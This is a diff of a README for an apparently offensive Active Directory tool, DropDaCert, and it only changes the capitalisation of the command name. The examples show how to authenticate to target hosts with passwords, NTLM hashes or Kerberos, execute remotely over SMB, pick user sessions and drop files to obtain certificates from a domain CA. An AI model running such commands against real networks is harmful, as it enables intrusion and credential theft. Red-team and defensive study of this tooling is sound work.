@@ -18,39 +18,39 @@ This installs [certipy](https://github.com/ly4k/Certipy) and [psexecsvc](https:/
 ## Usage
 
 ```
-dropdacert [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
+DropDaCert [[domain/]username[:password]@]target -ca HOST\CA -dc DC_IP [options]
 ```
 
 ### Examples
 
 ```bash
 # Password auth, interactive session picker
-dropdacert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # Target a specific user
-dropdacert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
+DropDaCert administrator:'Pass123'@10.0.0.5 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1 -tu jsmith
 
 # Domain auth
-dropdacert corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
+DropDaCert corp.local/admin:'Pass'@server01 -ca 'CA01.corp.local\Corp-CA' -dc 10.0.0.1
 
 # NTLM hash
-dropdacert administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
+DropDaCert administrator@10.0.0.5 -H :abc123def... -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos
-dropdacert corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+DropDaCert corp.local/admin:'Pass'@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # Kerberos with ccache
 export KRB5CCNAME=admin.ccache
-dropdacert corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
+DropDaCert corp.local/admin@server01 -k -ca 'CA01\CA' -dc 10.0.0.1
 
 # SMB exec (no WinRM needed)
-dropdacert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
+DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method smb
 
 # Manual mode — generate files and print instructions only
-dropdacert admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
+DropDaCert admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
 
 # Non-admin target (C:\Users\Public + cmd wrapper)
-dropdacert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
+DropDaCert admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
   --drop-dir 'C:\Users\Public' --exec-wrapper cmd
 ```
 
